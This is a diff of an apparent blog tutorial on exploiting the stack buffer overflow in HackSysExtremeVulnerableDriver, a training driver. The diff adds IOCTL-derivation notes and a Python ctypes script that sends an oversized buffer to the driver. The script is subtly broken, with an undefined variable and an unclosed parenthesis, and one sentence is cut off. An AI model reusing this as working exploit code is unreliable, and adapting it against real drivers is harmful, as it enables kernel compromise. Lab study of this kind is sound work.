@@ -79,7 +79,7 @@ Let's have a look at the source code first.
 ![IrpDeviceIoCtlHandler source code](/assets/img/code_IrpDeviceIoCtlHandler.png)
 *source code of the IrpDeviceIoCtlHandler*
 
-Driver will execute the <code>BufferOverflowStackIoctlHandler</code> function, in case of *HEVD_IOCTL_BUFFER_OVERFLOW_STACK* value in the switch statement. *HEVD_IOCTL_BUFFER_OVERFLOW_STACK* is a macro that corresponds to the IOCTL with 0x800 function code in it. So in order to trigger the vulnerability, we need to use 0x800 in the IOCTL creation.
+Driver will execute the <code>BufferOverflowStackIoctlHandler</code> function, in case of *HEVD_IOCTL_BUFFER_OVERFLOW_STACK* value in the switch statement. *HEVD_IOCTL_BUFFER_OVERFLOW_STACK* is a macro that corresponds to the IOCTL with 0x800 function code in it. So in order to trigger the vulnerability, we need to use 0x800 in the IOCTL creation. Other IOCTL sections are constant: *FILE_DEVICE_UNKNOWN, METHOD_NEITHER, FILE_ANY_ACCESS*
 
 ![IOCTL definitions](/assets/img/code_IOCTL_definitions.png)
 *IOCTL definitions*
@@ -90,17 +90,39 @@ This is how the disassembled <code>IrpDeviceIoCtlHandler</code> function code lo
 *switch statement and IOCTL handler*
 
 <code>0x222003</code> is deducted from the IOCTL value held in ECX and the result is loaded into EAX register (1). If the difference is larger than <code>0x6C</code>, program jumps to a different part of code to return *"[-] Invalid IOCTL Code: "* message. It means there are 109 possible IOCTL codes that will be accepted by the program, in the range <code>0x222003 - 0x22206f</code>.
+
 <br>
-If the difference is smaller than or equal <code>0x6C</code>, the IOCTL is used in the *jmp* instruction to jump to the correct offset from the jump table (2). In the bottom of the picture, we see code at one of the offsets that calls <code>BufferOverflowStackIoctlHandler</code>(3).
 
-### <span class="myheader">Exploitation</span>
+If the difference is smaller or equal to <code>0x6C</code>, the IOCTL is used in the *jmp* instruction to jump to the correct offset from the jump table (2). In the bottom of the picture, we see code at one of the offsets that calls <code>BufferOverflowStackIoctlHandler</code>(3).
 
-With all the relevant information needed to trigger the vulnerability, we can build exploit. To communicate, we need first to open a handle from userland to the target device using <code>CreateFile</code> API, putting instead of file name name of the HEVD device, which we can get e.g. from WinObj tool:
+<br>
+
+To create IOCTLs, we can use online IOCTL decoder [^1] and provide all values in the given range to see which ones fit our needs. If we put the first value, 0x222003, we see that this is the correct IOCTL to trigger stack buffer overflow:
+
+![Online IOCTL decoder](/assets/img/online_ioctl_decoder.png)
+*online IOCTL decoder*
+
+We can also create IOCTL values from scratch with some Python code. To do that, we need look up hex values of the IOCTL constants (e.g. [here](https://github.com/tandasat/WinIoCtlDecoder/blob/master/plugins/WinIoCtlDecoder.py)): 
++ FILE_DEVICE_UNKNOWN = 0x22 
++ METHOD_NEITHER = 0x3
++ FILE_ANY_ACCESS = 0x0
+
+From the [Primer](https://wojtekgoo.github.io/posts/A_Primer_On_Windows_Drivers/#fnref:4) we know that wer have to move *Device Type* to the 16th bit, *Required Access* to the 14th bit, *Function Code* to 2nd and *Transfer Type* to the end:
+
+```python
+ioctl = hex((0x22 << 16) | (0x0 << 14) | (0x800 << 2) | 0x3)
+```
+
+### <span class="myheader">Exploit code</span>
+
+With all the relevant information needed to trigger the vulnerability, we can build exploit. To develop exploit we will use <code>ctypes</code> library that allow Python code to call C functions and enable low-level memory manipulation.
+<br>
+To communicate, we need first to open a handle from userland to the target device using <code>CreateFile</code> API[^1], putting instead of file name name of the HEVD device, which we can get e.g. from the WinObj tool.
 
 ![Name of HEVD device](/assets/img/winobj_nameOfHevdDevice.png)
 *device name in WinObj tool*
 
-Then we use <code>ctypes</code> library in Python to start building exploit: 
+To send and receive messages to and from kernel driver, we can use <code>DeviceIoControl</code> API. Before we do that, we need to create proper IOCTL that will be dissected and understood by the HEVD device. We can use for that 
 
 ```python
 import ctypes, sys, struct
@@ -109,18 +131,43 @@ from subprocess import *
 
 kernel32 = windll.kernel32
 
-hevd = kernel32.CreateFileW("\\\\.\\HackSysExtremeVulnerableDriver",
-                            0xC0000000,
-                            0,
-                            None,
-                            0x3,
-                            0,
-                            None
-                            )
+# open handle to the device
+hevd = kernel32.CreateFileW(
+    "\\\\.\\HackSysExtremeVulnerableDriver",    # file name
+    0xC0000000,     # access: GENERIC READ | GENERIC WRITE, bits 30 and 31 are set
+    0,                                          
+    None,
+    0x3,            # action to take on a device: OPEN EXISTING 
+    0,
+    None
+)
     
 if (not hevd) or (hevd == -1):
-    print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
+    print("[-] Failed to retrieve handle: " + str(GetLastError()))
     sys.exit(1)
-else:
-    print("[*] Successfully retrieved handle to device-driver: " + str(hevd))
+
+# malicious payload
+payload = "\x41" * 3000
+payload_size = len(buf)
+
+# send message to the device
+kernel32.DeviceIoControl(
+    hevd,               # device handle
+    0x222003,           # IOCTL
+    payload,            
+    payload_size,       
+    None,
+    0,
+    None,
+    byref(c_ulong(),
+    None
+)
+
 ```
+
+
+
+## <span class="myheader">References<span>
+
+[^1]: https://www.osronline.com/article.cfm%5earticle=229.htm
+[^2]: https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
